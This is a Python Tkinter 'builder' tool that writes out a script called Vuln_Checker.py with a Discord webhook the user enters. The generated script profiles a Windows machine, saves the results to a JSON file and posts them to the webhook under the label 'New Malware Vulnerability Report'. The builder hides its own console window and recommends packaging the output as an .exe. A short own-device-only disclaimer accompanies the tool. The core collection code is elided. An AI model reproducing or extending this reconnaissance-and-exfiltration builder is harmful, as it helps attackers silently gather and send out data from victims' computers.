import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
import sys
import requests

# -----------------------------
# Hide CMD Window on Windows
# -----------------------------
if os.name == 'nt':
    import ctypes
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

# -----------------------------
# TEMPLATE FOR VULN_CHECKER
# -----------------------------
VULN_CHECKER_TEMPLATE = '''
import os
import platform
import json
import subprocess
import getpass
import socket
import ctypes
import wmi  # pip install wmi
import winreg
import requests

WEBHOOK_URL = "{webhook}"

# (All Vuln_Checker code remains here...)

json_path = "Vulns.json"
with open(json_path, "w") as f:
    json.dump(vulns, f, indent=4)

def send_to_discord(json_file_path):
    try:
        with open(json_file_path, "r") as f:
            data = f.read()
        payload = {{
            "content": f"New Malware Vulnerability Report:\\n```json\\n{{data}}\\n```"
        }}
        response = requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error sending to Discord: {{e}}")

send_to_discord(json_path)
'''

# -----------------------------
# FUNCTIONS
# -----------------------------
def build_script():
    webhook = webhook_entry.get().strip()
    if not terms_var.get():
        messagebox.showwarning("Warning", "You must agree to the Terms and Conditions.")
        return
    if not webhook:
        messagebox.showwarning("Warning", "Please enter a Discord webhook URL.")
        return

    try:
        with open("Vuln_Checker.py", "w") as f:
            f.write(VULN_CHECKER_TEMPLATE.format(webhook=webhook))
        messagebox.showinfo("Success", "Vuln_Checker.py has been built!\nNote: I recommend converting Vuln_Checker.py into an .exe")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to build script: {e}")

def toggle_build_button():
    build_btn.config(state="normal" if terms_var.get() else "disabled")
    test_btn.config(state="normal" if webhook_entry.get().strip() else "disabled")

def test_webhook():
    webhook = webhook_entry.get().strip()
    if not webhook:
        messagebox.showwarning("Warning", "Please enter a Discord webhook URL to test.")
        return
    try:
        payload = {"content": "Test message from Builder.py"}
        response = requests.post(webhook, json=payload)
        if response.status_code in (200, 204):
            messagebox.showinfo("Success", "Webhook test successful!")
        else:
            messagebox.showerror("Error", f"Webhook test failed: {response.status_code} - {response.text}")
    except Exception as e:
        messagebox.showerror("Error", f"Webhook test failed: {e}")

# Update buttons state when webhook entry changes
def on_webhook_entry_change(event):
    toggle_build_button()

# -----------------------------
# GUI SETUP
# -----------------------------
root = tk.Tk()
root.title("Vuln_Checker Builder")
root.geometry("700x650")  # Bigger window

# Title Label
tk.Label(root, text="Made By Mitan7", font=("Arial", 20, "bold")).pack(pady=10)

# Terms & Conditions text box
tk.Label(root, text="Terms and Conditions:").pack()
terms_text = scrolledtext.ScrolledText(root, width=80, height=15)
terms_text.pack()
terms_text.insert(tk.END, """Mitan7’s Terms & Conditions for using “Windows 11 Vulnerability Information Script”:

This file is to quickly learn about YOUR or a VMs device. NOT a device you DON’T own. This is NOT to be accompanied with malware or pre-scoping in attacks. That is UNETHICAL and ILLEGAL, and it could get you ARRESTED! This is for genuine, legit, and purposeful use on your or a VMs device to checks how vulnerable it is overall. I hope you use this for the right deeds and needs.
""")
terms_text.config(state='disabled')

# Checkbox for agreement
terms_var = tk.IntVar()
tk.Checkbutton(root, text="I agree to the Terms and Conditions", variable=terms_var, command=toggle_build_button).pack(pady=10)

# Discord webhook entry
tk.Label(root, text="Discord Webhook URL:").pack()
webhook_entry = tk.Entry(root, width=80)
webhook_entry.pack(pady=5)
webhook_entry.bind("<KeyRelease>", on_webhook_entry_change)

# Buttons frame
btn_frame = tk.Frame(root)
btn_frame.pack(pady=20)

# Build button
build_btn = tk.Button(btn_frame, text="Build", command=build_script, width=25, height=2, state="disabled")
build_btn.grid(row=0, column=0, padx=10)

# Test Webhook button
test_btn = tk.Button(btn_frame, text="Test Webhook", command=test_webhook, width=25, height=2, state="disabled")
test_btn.grid(row=0, column=1, padx=10)

root.mainloop()
